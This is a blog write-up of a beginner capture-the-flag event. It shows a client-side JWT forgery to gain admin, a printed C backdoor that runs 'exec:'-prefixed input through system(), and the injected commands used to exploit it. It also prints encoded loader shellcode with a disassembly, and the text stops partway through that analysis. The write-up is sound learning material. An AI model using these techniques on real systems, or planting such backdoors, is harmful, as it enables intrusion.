<!doctype html><html data-theme=dark lang=en xmlns=http://www.w3.org/1999/xhtml><head><meta charset=UTF-8><meta name=description><meta content="width=device-width,initial-scale=1" name=viewport><meta content=#9a9996 name=theme-color><meta content=#20c20e media=(prefers-color-scheme:dark) name=theme-color><title>Ô∏èüè¥ MetaCTF January 2025 Flash CTF - psypherpunk::blog</title><link href=https://blog.psypherpunk.io/blog/metactf-january-2025-flash-ctf/ rel=canonical><link href=https://blog.psypherpunk.io/favicon.png rel=icon type=image/png><link href=https://blog.psypherpunk.io/apple-touch-icon.png rel=apple-touch-icon sizes=180x180 type=image/png><link title="psypherpunk::blog - RSS Feed" href=https://blog.psypherpunk.io/rss.xml rel=alternate type=application/rss+xml><link title="psypherpunk::blog - Atom Feed" href=https://blog.psypherpunk.io/atom.xml rel=alternate type=application/atom+xml><style>:root{--accent-color:#6f8396}[data-theme=dark]{--accent-color:#20c20e}@media (prefers-color-scheme:dark){:root:not([data-theme=light]){--accent-color:#20c20e}}</style><link href=https://blog.psypherpunk.io/style.css rel=stylesheet><script defer src=https://blog.psypherpunk.io/closable.js></script><meta content=psypherpunk::blog property=og:site_name><meta content="Ô∏èüè¥ MetaCTF January 2025 Flash CTF - psypherpunk::blog" property=og:title><meta content=https://blog.psypherpunk.io/blog/metactf-january-2025-flash-ctf/ property=og:url><meta content="A monthly mini CTF competition organized by MetaCTF and Antisyphon." property=og:description><meta content=https://blog.psypherpunk.io/card.png property=og:image><meta content=en_US property=og:locale><body><header id=site-nav><nav><a href=#main-content tabindex=0> Skip to Main Content </a><ul><li id=home><a href=https://blog.psypherpunk.io> <i class=icon></i>psypherpunk::blog</a><li class=divider><li><a href=https://blog.psypherpunk.io/blog/>Blog</a><li id=feed><details class=closable><summary class=circle title=Feed><i class=icon></i></summary> <ul><li><a href=https://blog.psypherpunk.io/rss.xml>RSS</a><li><a href=https://blog.psypherpunk.io/atom.xml>Atom</a></ul></details></ul></nav></header><main id=main-content><article><div id=heading><p><small> <time datetime=" 2025-01-26T00:00:00+00:00">Published on January 26, 2025</time></small><h1>Ô∏èüè¥ MetaCTF January 2025 Flash CTF</h1><ul class=tags><li><a class=tag href=https://blog.psypherpunk.io/categories/ctf/>ctf</a></ul><ul class=tags><li><a class=tag href=https://blog.psypherpunk.io/tags/ctf/>ctf</a></ul></div><div id=buttons-container><a title="Go to Top" href=#top id=go-to-top><i class=icon></i></a></div><blockquote><p><em>A monthly mini CTF competition organized by MetaCTF with support from Antisyphon Training, TCM Security, Simply Cyber Academy. There will be 5 challenges and you will have 2 hours to solve as many as you can. This is a beginner-friendly CTF.</em></blockquote><p>Details here: <a href=https://app.metactf.com/join/jan2025>https://app.metactf.com/join/jan2025</a>.</p><span id=continue-reading></span><h2 id=cooked-books>Cooked Books</h2><blockquote><p><em>We signed up for a new digital library provider, but the numbers they‚Äôre giving us for the amount of times that our banned book selection is getting borrowed doesn‚Äôt seem right, we believe they‚Äôre hiding some sort of message in the report.</em><p><em>Download the report <a href=https://metaproblems.com/b6672e84d7521b831764815b79d363c3/banned_books_report.csv>here</a>.</em></blockquote><p>The data look something like this:<table><thead><tr><th>Title<th>Author<th>Times Borrowed<th>Avg Rating<tbody><tr><td>To Kill a Mockingbird<td>Harper Lee<td>77<td>4.26<tr><td>1984<td>George Orwell<td>101<td>4.2<tr><td>The Catcher in the Rye<td>J.D. Salinger<td>116<td>3.8<tr><td>The Handmaid‚Äôs Tale<td>Margaret Atwood<td>97<td>4.14<tr><td>Fahrenheit 451<td>Ray Bradbury<td>67<td>3.96<tr><td>The Bluest Eye<td>Toni Morrison<td>84<td>4.12<tr><td>Of Mice and Men<td>John Steinbeck<td>70<td>3.89<tr><td>Animal Farm<td>George Orwell<td>123<td>4.0<tr><td>Lord of the Flies<td>William Golding<td>49<td>3.7</table><p>As implied by the description, the <em>Times Borrowed</em> is suspiciously in the ASCII range for all rows:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>>>> </span><span style=color:#b48ead>import </span><span>csv
</span><span>>>> </span><span style=color:#b48ead>with </span><span style=color:#96b5b4>open</span><span>("</span><span style=color:#a3be8c>banned_books_report.csv</span><span>") </span><span style=color:#b48ead>as </span><span>i:
</span><span style=color:#d08770>...     </span><span style=color:#96b5b4>print</span><span>(
</span><span style=color:#d08770>...         </span><span>"".</span><span style=color:#bf616a>join</span><span>(</span><span style=color:#96b5b4>chr</span><span>(</span><span style=color:#bf616a>int</span><span>(book["</span><span style=color:#a3be8c>Times Borrowed</span><span>"])) </span><span style=color:#b48ead>for </span><span>book </span><span style=color:#b48ead>in </span><span>csv.</span><span style=color:#bf616a>DictReader</span><span>(i))
</span><span style=color:#d08770>...     </span><span>)
</span><span style=color:#d08770>...
</span><span>MetaCTF{1nf0rm4ti0n_1s_p0w3r}
</span></code></pre><h2 id=trading-places>Trading Places</h2><blockquote><p><em>My friends Hannah and Steven from college are starting up a new fintech company. They sent me the link to their trading platform so I can take a look (in demo mode). It‚Äôs supposedly quite secure, using the latest in cryptographic standards.</em><p><em>Why don‚Äôt you take <a href=https://host5.metaproblems.com:7606/>a look</a>?</em></blockquote><p>The site provides <code>guest</code>:<code>guest</code> credentials to authenticate, after which it kindly informs users that:<blockquote><p><em>Guest preview mode enabled - <code>admin</code> login required to make trades.</em></blockquote><p>Once authenticated, we‚Äôre provided a JWT. However, the actual process that sets said JWT is a little odd:<pre class=language-js data-lang=js style=color:#c0c5ce;background-color:#2b303b><code class=language-js data-lang=js><span><</span><span style=color:#bf616a>script type</span><span>="</span><span style=color:#a3be8c>module</span><span>">
</span><span>    </span><span style=color:#b48ead>import </span><span style=color:#d08770>* </span><span style=color:#b48ead>as </span><span style=color:#bf616a>jose </span><span style=color:#b48ead>from </span><span>'</span><span style=color:#a3be8c>https://cdn.jsdelivr.net/npm/jose@latest/dist/browser/index.js</span><span>';
</span><span>    </span><span style=color:#b48ead>const </span><span>{ </span><span style=color:#bf616a>SignJWT </span><span>} = </span><span style=color:#bf616a>jose</span><span>;
</span><span>
</span><span>    window.</span><span style=color:#8fa1b3>onload </span><span>= </span><span style=color:#b48ead>function </span><span>() {
</span><span>        document.</span><span style=color:#96b5b4>getElementById</span><span>('</span><span style=color:#a3be8c>login-form</span><span>').</span><span style=color:#8fa1b3>onsubmit </span><span>= </span><span style=color:#b48ead>async </span><span>(</span><span style=color:#bf616a>e</span><span>) </span><span style=color:#b48ead>=> </span><span>{
</span><span>            </span><span style=color:#bf616a>e</span><span>.</span><span style=color:#96b5b4>preventDefault</span><span>();
</span><span>            </span><span style=color:#b48ead>const </span><span style=color:#bf616a>formData </span><span>= new FormData(</span><span style=color:#bf616a>e</span><span>.target);
</span><span>            </span><span style=color:#b48ead>const </span><span style=color:#bf616a>user </span><span>= </span><span style=color:#bf616a>formData</span><span>.</span><span style=color:#96b5b4>get</span><span>('</span><span style=color:#a3be8c>username</span><span>');
</span><span>            </span><span style=color:#b48ead>const </span><span style=color:#bf616a>pass </span><span>= </span><span style=color:#bf616a>formData</span><span>.</span><span style=color:#96b5b4>get</span><span>('</span><span style=color:#a3be8c>password</span><span>');
</span><span>            </span><span style=color:#b48ead>const </span><span style=color:#bf616a>response </span><span>= </span><span style=color:#b48ead>await </span><span style=color:#8fa1b3>fetch</span><span>('</span><span style=color:#a3be8c>/login</span><span>', {
</span><span>                method: '</span><span style=color:#a3be8c>POST</span><span>',
</span><span>                body: new URLSearchParams({
</span><span>                    username: </span><span style=color:#bf616a>user</span><span>,
</span><span>                    password: </span><span style=color:#bf616a>pass
</span><span>                }),
</span><span>                headers: { '</span><span style=color:#a3be8c>Content-Type</span><span>': '</span><span style=color:#a3be8c>application/x-www-form-urlencoded</span><span>' }
</span><span>            });
</span><span>            </span><span style=color:#b48ead>let </span><span style=color:#bf616a>resp </span><span>= </span><span style=color:#b48ead>await </span><span style=color:#bf616a>response</span><span>.</span><span style=color:#8fa1b3>json</span><span>();
</span><span>            </span><span style=color:#b48ead>if </span><span>("</span><span style=color:#a3be8c>success</span><span>" in </span><span style=color:#bf616a>resp</span><span>) {
</span><span>                </span><span style=color:#b48ead>const </span><span style=color:#bf616a>token </span><span>= new TextEncoder().</span><span style=color:#8fa1b3>encode</span><span>(</span><span style=color:#bf616a>response</span><span>.headers.</span><span style=color:#96b5b4>get</span><span>("</span><span style=color:#a3be8c>jwt</span><span>"));
</span><span>                </span><span style=color:#b48ead>const </span><span style=color:#bf616a>jwt </span><span>= </span><span style=color:#b48ead>await </span><span>new SignJWT({ sub: </span><span style=color:#bf616a>user </span><span>})
</span><span>                    .</span><span style=color:#8fa1b3>setProtectedHeader</span><span>({ alg: "</span><span style=color:#a3be8c>HS256</span><span>" })
</span><span>                    .</span><span style=color:#8fa1b3>setIssuedAt</span><span>()
</span><span>                    .</span><span style=color:#8fa1b3>setExpirationTime</span><span>("</span><span style=color:#a3be8c>2h</span><span>")
</span><span>                    .</span><span style=color:#8fa1b3>sign</span><span>(</span><span style=color:#bf616a>token</span><span>);
</span><span>                document.cookie = "</span><span style=color:#a3be8c>jwt=</span><span>" + </span><span style=color:#bf616a>jwt</span><span>;
</span><span>                window.location.href = "</span><span style=color:#a3be8c>/dashboard</span><span>";
</span><span>            } </span><span style=color:#b48ead>else </span><span>{
</span><span>                </span><span style=color:#8fa1b3>alert</span><span>("</span><span style=color:#a3be8c>Incorrect username or password.</span><span>");
</span><span>            }
</span><span>        };
</span><span>    }
</span><span>&LT/</span><span style=color:#bf616a>script</span><span>>
</span></code></pre><p>Having authenticated as <code>guest</code>, the resulting token is signed <em>but</em> the <code>sub</code> is derived and the token signed client-side: can <code>sub</code> be set to <code>admin</code>?<p>Adapting the above and using the browser console:<pre class=language-js data-lang=js style=color:#c0c5ce;background-color:#2b303b><code class=language-js data-lang=js><span>import('</span><span style=color:#a3be8c>https://cdn.jsdelivr.net/npm/jose@latest/dist/browser/index.js</span><span>').</span><span style=color:#96b5b4>then</span><span>(</span><span style=color:#bf616a>m </span><span style=color:#b48ead>=> </span><span style=color:#bf616a>jose </span><span>= </span><span style=color:#bf616a>m</span><span>);
</span><span style=color:#b48ead>const </span><span>{ </span><span style=color:#bf616a>SignJWT </span><span>} = </span><span style=color:#bf616a>jose</span><span>;
</span><span>
</span><span style=color:#b48ead>const </span><span style=color:#bf616a>user </span><span>= '</span><span style=color:#a3be8c>guest</span><span>';
</span><span style=color:#b48ead>const </span><span style=color:#bf616a>pass </span><span>= '</span><span style=color:#a3be8c>guest</span><span>'
</span><span style=color:#b48ead>const </span><span style=color:#bf616a>response </span><span>= </span><span style=color:#b48ead>await </span><span style=color:#8fa1b3>fetch</span><span>('</span><span style=color:#a3be8c>/login</span><span>', {
</span><span>    method: '</span><span style=color:#a3be8c>POST</span><span>',
</span><span>    body: new URLSearchParams({
</span><span>        username: </span><span style=color:#bf616a>user</span><span>,
</span><span>        password: </span><span style=color:#bf616a>pass
</span><span>    }),
</span><span>    headers: { '</span><span style=color:#a3be8c>Content-Type</span><span>': '</span><span style=color:#a3be8c>application/x-www-form-urlencoded</span><span>' }
</span><span>});
</span><span>
</span><span style=color:#b48ead>let </span><span style=color:#bf616a>resp </span><span>= </span><span style=color:#b48ead>await </span><span style=color:#bf616a>response</span><span>.</span><span style=color:#8fa1b3>json</span><span>();
</span><span style=color:#b48ead>if </span><span>("</span><span style=color:#a3be8c>success</span><span>" in </span><span style=color:#bf616a>resp</span><span>) {
</span><span>    </span><span style=color:#b48ead>const </span><span style=color:#bf616a>token </span><span>= new TextEncoder().</span><span style=color:#8fa1b3>encode</span><span>(</span><span style=color:#bf616a>response</span><span>.headers.</span><span style=color:#96b5b4>get</span><span>("</span><span style=color:#a3be8c>jwt</span><span>"));
</span><span>    </span><span style=color:#b48ead>const </span><span style=color:#bf616a>jwt </span><span>= </span><span style=color:#b48ead>await </span><span>new SignJWT({ sub: '</span><span style=color:#a3be8c>admin</span><span>' })
</span><span>        .</span><span style=color:#8fa1b3>setProtectedHeader</span><span>({ alg: "</span><span style=color:#a3be8c>HS256</span><span>" })
</span><span>        .</span><span style=color:#8fa1b3>setIssuedAt</span><span>()
</span><span>        .</span><span style=color:#8fa1b3>setExpirationTime</span><span>("</span><span style=color:#a3be8c>2h</span><span>")
</span><span>        .</span><span style=color:#8fa1b3>sign</span><span>(</span><span style=color:#bf616a>token</span><span>);
</span><span>    document.cookie = "</span><span style=color:#a3be8c>jwt=</span><span>" + </span><span style=color:#bf616a>jwt</span><span>;
</span><span>    window.location.href = "</span><span style=color:#a3be8c>/dashboard</span><span>";
</span><span>} </span><span style=color:#b48ead>else </span><span>{
</span><span>    </span><span style=color:#8fa1b3>alert</span><span>("</span><span style=color:#a3be8c>Incorrect username or password.</span><span>");
</span><span>}
</span></code></pre><p>The dashboard then contains:<pre class=language-html data-lang=html style=color:#c0c5ce;background-color:#2b303b><code class=language-html data-lang=html><span><</span><span style=color:#bf616a>h2</span><span>>The flag is <</span><span style=color:#bf616a>code</span><span>>MetaCTF{cli3nt_s1d3_crypt0graph1c5}&LT/</span><span style=color:#bf616a>code</span><span>>&LT/</span><span style=color:#bf616a>h2</span><span>>
</span><span><</span><span style=color:#bf616a>center</span><span>><</span><span style=color:#bf616a>p</span><span>>Congrats!&LT/</span><span style=color:#bf616a>p</span><span>>&LT/</span><span style=color:#bf616a>center</span><span>>
</span></code></pre><h2 id=rear-hatch>Rear Hatch</h2><blockquote><p><em>We‚Äôve been getting a lot of suspicious reports in our Maintenance Schedule Management application, we‚Äôre worried that the contractor who we had write the application may have included some sort of backdoor, can you check it out?</em><p><em>Download the source code <a href=https://metaproblems.com/10d1e378bb37262a842c256f481d3fb5/RearHatch.c>here</a>, then when you‚Äôre ready, connect to the real service with <code>nc kubenode.mctf.io 30014</code></em></blockquote><p>The source code does indeed contain this odd function:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>void </span><span style=color:#8fa1b3>markRequestCompleted</span><span>() {
</span><span>    </span><span style=color:#b48ead>int</span><span> id;
</span><span>    </span><span style=color:#96b5b4>printf</span><span>("</span><span style=color:#a3be8c>Enter the ID of the request to mark as completed: </span><span>");
</span><span>    </span><span style=color:#96b5b4>scanf</span><span>("</span><span style=color:#d08770>%d</span><span>", &id);
</span><span>    </span><span style=color:#b48ead>for </span><span>(</span><span style=color:#b48ead>int</span><span> i = </span><span style=color:#d08770>0</span><span>; i < requestCount; i++) {
</span><span>        </span><span style=color:#b48ead>if </span><span>(requests[i].</span><span style=color:#bf616a>id </span><span>== id && (</span><span style=color:#96b5b4>strncmp</span><span>((</span><span style=color:#b48ead>char </span><span>*)requests+i*</span><span style=color:#d08770>264</span><span>+</span><span style=color:#d08770>4</span><span>,"</span><span style=color:#96b5b4>\x65\x78\x65\x63\x3a</span><span>",</span><span style=color:#d08770>5</span><span>)==</span><span style=color:#d08770>0</span><span>?</span><span style=color:#96b5b4>system</span><span>((</span><span style=color:#b48ead>char </span><span>*)requests+i*</span><span style=color:#d08770>264</span><span>+</span><span style=color:#d08770>9</span><span>),</span><span style=color:#d08770>1</span><span>:</span><span style=color:#d08770>1</span><span>)) {
</span><span>            requests[i].</span><span style=color:#bf616a>isCompleted </span><span>= </span><span style=color:#d08770>1</span><span>;
</span><span>            </span><span style=color:#bf616a>saveRequests</span><span>();
</span><span>            </span><span style=color:#96b5b4>printf</span><span>("</span><span style=color:#a3be8c>Request marked as completed.</span><span style=color:#96b5b4>\n</span><span>");
</span><span>            </span><span style=color:#b48ead>return</span><span>;
</span><span>        }
</span><span>    }
</span><span>    </span><span style=color:#96b5b4>printf</span><span>("</span><span style=color:#a3be8c>Request with ID </span><span style=color:#d08770>%d</span><span style=color:#a3be8c> not found.</span><span style=color:#96b5b4>\n</span><span>", id);
</span><span>    </span><span style=color:#b48ead>return</span><span>;
</span><span>}
</span></code></pre><p><em>Odd</em> insofar as those bytes have an interesting meaning:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>>>> </span><span style=color:#96b5b4>print</span><span>("</span><span style=color:#96b5b4>\x65\x78\x65\x63\x3a</span><span>")
</span><span style=color:#b48ead>exec</span><span>:
</span></code></pre><p>So if a request <em>starts</em> with <code>exec:</code>, <code>system()</code> will be called against the subsequent bytes.<p>However, it‚Äôs not clear where the flag is but that can be determined readily enough:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>‚ùØ</span><span> nc kubenode.mctf.io 30014
</span><span style=color:#bf616a>No</span><span> existing data file found. Starting fresh.
</span><span>
</span><span>=</span><span style=color:#a3be8c>== </span><span style=color:#bf616a>Maintenance</span><span> Schedule Management ===
</span><span style=color:#bf616a>1.</span><span> Add Maintenance Request
</span><span style=color:#bf616a>2.</span><span> View Maintenance Requests
</span><span style=color:#bf616a>3.</span><span> Delete Maintenance Request
</span><span style=color:#bf616a>4.</span><span> Mark Request as Completed
</span><span style=color:#bf616a>5.</span><span> Exit
</span><span>=</span><span style=color:#a3be8c>======================================
</span><span style=color:#bf616a>Enter</span><span> your choice: 1
</span><span style=color:#bf616a>Enter</span><span> description for the maintenance request: exec:ls
</span><span style=color:#bf616a>Request</span><span> added successfully.
</span><span>
</span><span>=</span><span style=color:#a3be8c>== </span><span style=color:#bf616a>Maintenance</span><span> Schedule Management ===
</span><span style=color:#bf616a>1.</span><span> Add Maintenance Request
</span><span style=color:#bf616a>2.</span><span> View Maintenance Requests
</span><span style=color:#bf616a>3.</span><span> Delete Maintenance Request
</span><span style=color:#bf616a>4.</span><span> Mark Request as Completed
</span><span style=color:#bf616a>5.</span><span> Exit
</span><span>=</span><span style=color:#a3be8c>======================================
</span><span style=color:#bf616a>Enter</span><span> your choice: 4
</span><span style=color:#bf616a>Enter</span><span> the ID of the request to mark as completed: 1
</span><span style=color:#bf616a>flag.txt
</span><span style=color:#bf616a>run
</span><span style=color:#bf616a>Request</span><span> marked as completed.
</span></code></pre><p>Oh. I should have guessed.<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span>=</span><span style=color:#a3be8c>== </span><span style=color:#bf616a>Maintenance</span><span> Schedule Management ===
</span><span style=color:#bf616a>1.</span><span> Add Maintenance Request
</span><span style=color:#bf616a>2.</span><span> View Maintenance Requests
</span><span style=color:#bf616a>3.</span><span> Delete Maintenance Request
</span><span style=color:#bf616a>4.</span><span> Mark Request as Completed
</span><span style=color:#bf616a>5.</span><span> Exit
</span><span>=</span><span style=color:#a3be8c>======================================
</span><span style=color:#bf616a>Enter</span><span> your choice: 1
</span><span style=color:#bf616a>Enter</span><span> description for the maintenance request: exec:cat flag.txt
</span><span style=color:#bf616a>Request</span><span> added successfully.
</span><span>
</span><span>=</span><span style=color:#a3be8c>== </span><span style=color:#bf616a>Maintenance</span><span> Schedule Management ===
</span><span style=color:#bf616a>1.</span><span> Add Maintenance Request
</span><span style=color:#bf616a>2.</span><span> View Maintenance Requests
</span><span style=color:#bf616a>3.</span><span> Delete Maintenance Request
</span><span style=color:#bf616a>4.</span><span> Mark Request as Completed
</span><span style=color:#bf616a>5.</span><span> Exit
</span><span>=</span><span style=color:#a3be8c>======================================
</span><span style=color:#bf616a>Enter</span><span> your choice: 4
</span><span style=color:#bf616a>Enter</span><span> the ID of the request to mark as completed: 2
</span><span style=color:#bf616a>MetaCTF{4lw4ys_r34d_4ll_7h3_c0d3</span><span>}</span><span style=color:#bf616a>Request</span><span> marked as completed.
</span></code></pre><h2 id=i-heard-you-liked-loaders>I Heard You Liked Loaders</h2><blockquote><p><em>I hope you like mine :)</em><p><em>Download the loader <a href=https://metaproblems.com/d8fdeee664c1699c80687aca2873f974/loader>here</a>.</em></blockquote><p>Yeah. ‚ÄúLoaders‚Äù. I definitely know what‚Äôs meant in this context.<p>Anyway‚Ä¶<p>Courtesy of <a href=https://binary.ninja/free/>BinaryNinja</a>:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span>int64_t </span><span style=color:#8fa1b3>main</span><span>()
</span><span>{
</span><span>    </span><span style=color:#b48ead>void</span><span>* fsbase;
</span><span>    int64_t rax = *(uint64_t*)((</span><span style=color:#b48ead>char</span><span>*)fsbase + </span><span style=color:#d08770>0x28</span><span>);
</span><span>    int64_t rax_1 = </span><span style=color:#bf616a>mmap</span><span>(</span><span style=color:#d08770>0</span><span>, </span><span style=color:#d08770>0x400</span><span>, </span><span style=color:#d08770>7</span><span>, </span><span style=color:#d08770>0x22</span><span>, </span><span style=color:#d08770>0xffffffff</span><span>, </span><span style=color:#d08770>0</span><span>);
</span><span>    </span><span style=color:#bf616a>__builtin_memcpy</span><span>(rax_1, "</span><span style=color:#96b5b4>\xbf\x01\x00\x00\x00\x48\x31\xf6\x48\x31\xd2\x4d\x31\xd2\xb8\x65\x00\x00\x00\x0f\x05\x48\x83\xf8\x00\x75\x02\xeb\x0a\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05\xe8\x00\x00\x00\x00\x48\x8d\x35\x1e\x00\x00\x00\x48\xff\xce\x8a\x06\x84\xc0\x74\x14\x8a\x5e\x01\x30\xd8\x32\x46\xff\x2c\x07\x88\x06\x48\xff\xc6\xeb\xe9\xff\xe6\x90\xff\x20\x50\xa6\x29\x59\xb8\x3e\x4e\xa6\x3b\x4b\x87\x3e\x4e\x79\xd2\xa7\x51\xc5\xb0\x51\xcc\xb9\x51\xd7\xa2\x71\x79\xfa\x26\xa7\x85\xa2\xa5\xa2\x1a\x3c\xe3\x3f\xae\xbc\xbb\xbc\xbb\xf4\xba\x82\x0d\x43\x71\x8e\xb3\x34\xb3\xf4\x34\xb0\x49\x41\x47\x40\x3a\x40\x44\x52\x27\x20\x27\x85\x53\x8a\xba\xb7\x43\x66\x80\x8e\xd8\x22\x3f\x89\x87\xdf\x3b\x0e\xd0\x80\xd7\x45\x2c\xad\xb2\xc7\x01\x73\x8e\xd4\xf0\x27\x05\xdb\x8b\x8f\x3f\x03\x82\x9d\xca\xf9\x4c\xc4\x44\xac\x6b\x50\x57\x6f\xa9\x48\x00\xcc\x00</span><span>", </span><span style=color:#d08770>0xcb</span><span>);
</span><span>    </span><span style=color:#bf616a>rax_1</span><span>();
</span><span>    
</span><span>    </span><span style=color:#b48ead>if </span><span>(rax == *(uint64_t*)((</span><span style=color:#b48ead>char</span><span>*)fsbase + </span><span style=color:#d08770>0x28</span><span>))
</span><span>        </span><span style=color:#b48ead>return </span><span style=color:#d08770>0</span><span>;
</span><span>    
</span><span>    </span><span style=color:#b48ead>return </span><span style=color:#bf616a>__stack_chk_fail</span><span>();
</span><span>}
</span></code></pre><p>‚Ä¶and courtesy of CyberChef (stripping all the <code>\x</code> and using its ‚ÄúDisassemble x86‚Äù operation), the above encoded shellcode appears to be:<pre class=language-as data-lang=as style=color:#c0c5ce;background-color:#2b303b><code class=language-as data-lang=as><span style=color:#d08770>0000000000000000</span><span> BF01000000                      MOV EDI,</span><span style=color:#d08770>00000001
</span><span style=color:#d08770>0000000000000005</span><span> 4831F6                          XOR RSI,RSI
</span><span style=color:#d08770>0000000000000008</span><span> 4831D2                          XOR RDX,RDX
</span><span>000000000000000B 4D31D2                          XOR R10,R10
</span><span>000000000000000E B865000000                      MOV EAX,</span><span style=color:#d08770>00000065
</span><span style=color:#d08770>0000000000000013</span><span> 0F05                            SYSCALL
</span><span style=color:#d08770>0000000000000015</span><span> 4883F800                        CMP RAX,</span><span style=color:#d08770>0000000000000000
</span><span style=color:#d08770>0000000000000019 7502</span><span>                            JNE 000000000000001D
</span><span>000000000000001B EB0A                            JMP </span><span style=color:#d08770>0000000000000027
</span><span>000000000000001D 4831FF                          XOR RDI,RDI
</span><span style=color:#d08770>0000000000000020</span><span> B83C000000                      MOV EAX,0000003C
</span><span style=color:#d08770>0000000000000025</span><span> 0F05                            SYSCALL
</span><span style=color:#d08770>0000000000000027</span><span> E800000000                      CALL </span><span style=color:#d08770>0000000</span><span>-FFFFFFD4
</span><span>000000000000002C 488D351E000000                  LEA RSI,[</span><span style=color:#d08770>0000000</span><span>-FFFFFFAF]
</span><span style=color:#d08770>0000000000000033</span><span> 48FFCE                          DEC RSI
</span><span style=color:#d08770>0000000000000036</span><span> 8A06                            MOV AL,BYTE PTR [RSI]
</span><span style=color:#d08770>0000000000000038</span><span> 84C0                            TEST AL,AL
</span><span>000000000000003A </span><span style=color:#d08770>7414</span><span>                            JE </span><span style=color:#d08770>0000000000000050
</span><span>000000000000003C 8A5E01                          MOV BL,BYTE PTR [RSI+</span><span style=color:#d08770>01</span><span>]
</span><span style=color:#d08770>000000000000003F</span><span> 30D8                            XOR AL,BL
</span><span style=color:#d08770>0000000000000041</span><span> 3246FF                          XOR AL,BYTE PTR [RSI-</span><span style=color:#d08770>01</span><span>]
</span><span style=color:#d08770>0000000000000044</span><span> 2C07                            SUB AL,</span><span style=color:#d08770>07
</span><span style=color:#d08770>0000000000000046 8806</span><span>                            MOV BYTE PTR [RSI],AL
</span><span style=color:#d08770>0000000000000048</span><span> 48FFC6                          INC RSI
</span><span>000000000000004B EBE9                            JMP </span><span style=color:#d08770>0000000000000036
</span><span>000000000000004D FFE6                            JMP RSI
</span><span style=color:#d08770>000000000000004F 90</span><span>                              NOP
</span><span style=color:#d08770>0000000000000050</span><span> FF20                            JMP QWORD PTR [RAX]
</span><span style=color:#d08770>0000000000000052 50</span><span>                              PUSH RAX
</span><span style=color:#d08770>0000000000000053</span><span> A6                              CMPS BYTE PTR [RDI],BYTE PTR [RSI]
</span><span style=color:#d08770>0000000000000054</span><span> 2959B8                          SUB DWORD PTR [RCX-</span><span style=color:#d08770>48</span><span>],EBX
</span><span style=color:#d08770>0000000000000057</span><span> 3E4EA6                          CMPS BYTE PTR DS:[RDI],BYTE PTR DS:[RSI]
</span><span>000000000000005A 3B4B87                          CMP ECX,DWORD PTR [RBX-</span><span style=color:#d08770>79</span><span>]
</span><span>000000000000005D 3E4E79D2                        HT  JNS </span><span style=color:#d08770>0000000000000033
</span><span style=color:#d08770>0000000000000061</span><span> A7                              CMPS DWORD PTR [RDI],DWORD PTR [RSI]
</span><span style=color:#d08770>0000000000000062 51</span><span>                              PUSH RCX
</span><span style=color:#d08770>0000000000000063</span><span> C5B051CC                        VSQRTPS XMM1,XMM4
</span><span style=color:#d08770>0000000000000067</span><span> B951D7A271                      MOV ECX,71A2D751
</span><span>000000000000006C 79FA                            JNS </span><span style=color:#d08770>0000000000000068
</span><span>000000000000006E 26A7                            CMPS DWORD PTR ES:[RDI],DWORD PTR ES:[RSI]
</span><span style=color:#d08770>0000000000000070</span><span> 85A2A5A21A3C                    TEST DWORD PTR [RDX+3C1AA2A5],ESP
</span><span style=color:#d08770>0000000000000076</span><span> E33F                            JRCXZ 00000000000000B7
</span><span style=color:#d08770>0000000000000078</span><span> AE                              SCAS AL,BYTE PTR [RDI]
</span><span style=color:#d08770>0000000000000079</span><span> BCBBBCBBF4                      MOV ESP,F4BBBCBB
</span><span>000000000000007E BA820D4371                      MOV EDX,71430D82
</span><span style=color:#d08770>0000000000000083</span><span> 8EB334B3F434                    MOV ST(-</span><span style=color:#d08770>2</span><span>),WORD PTR [RBX+34F4B334]
</span><span style=color:#d08770>0000000000000089</span><span> B049                            MOV AL,</span><span style=color:#d08770>49
</span><span>000000000000008B 4147403A4044                    CMP AL,BYTE PTR [RAX+</span><span style=color:#d08770>44</span><span>]
</span><span style=color:#d08770>0000000000000091 52</span><span>                              PUSH RDX
</span><span style=color:#d08770>0000000000000092 27                              </span><span>???
</span><span style=color:#d08770>0000000000000093 2027</span><span>                            AND BYTE PTR [RDI],AH
</span><span style=color:#d08770>0000000000000095</span><span> 85538A                          TEST DWORD PTR [RBX-</span><span style=color:#d08770>76</span><span>],EDX
</span><span style=color:#d08770>0000000000000098</span><span> BAB7436680                      MOV EDX,806643B7
</span><span>000000000000009D 8ED8                            MOV DS,EAX
</span><span style=color:#d08770>000000000000009F 223F</span><span>                            AND BH,BYTE PTR [RDI]
</span><span>00000000000000A1 8987DF3B0ED0                    MOV DWORD PTR [RDI-2FF1C421],EAX
</span><span>00000000000000A7 80D745                          ADC BH,</span><span style=color:#d08770>45
</span><span>00000000000000AA 2CAD                            SUB AL,AD
</span><span>00000000000000AC B2C7                            MOV DL,C7
</span><span>00000000000000AE 01738E                          ADD DWORD PTR [RBX-</span><span style=color:#d08770>72</span><span>],ESI
</span><span>00000000000000B1 D4                              ???
</span><span>00000000000000B2 F027                            ???
</span><span>00000000000000B4 05DB8B8F3F                      ADD EAX,3F8F8BDB
</span><span>00000000000000B9 03829DCAF94C                    ADD EAX,DWORD PTR [RDX+4CF9CA9D]
</span><span>00000000000000BF C444AC6B                        ???
</span><span>00000000000000C3 </span><span style=color:#d08770>50</span><span>                              PUSH RAX
</span><span>00000000000000C4 </span><span style=color:#d08770>57</span><span>                              PUSH RDI
</span><span>00000000000000C5 </span><span style=color:#d08770>6F</span><span>                              OUTS DX,DWORD PTR [RSI]
</span><span>00000000000000C6 A948000CC0                      TEST EAX,C00C0048
</span></code></pre><p>The initial part contains an anti-debugging check, specifically checking for <a href=https://x64.syscall.sh/><code>ptrace</code></a>:<pre class=language-as data-lang=as style=color:#c0c5ce;background-color:#2b303b><code class=language-as data-lang=as><span>MOV EAX,</span><span style=color:#d08770>00000065
</span><span>SYSCALL
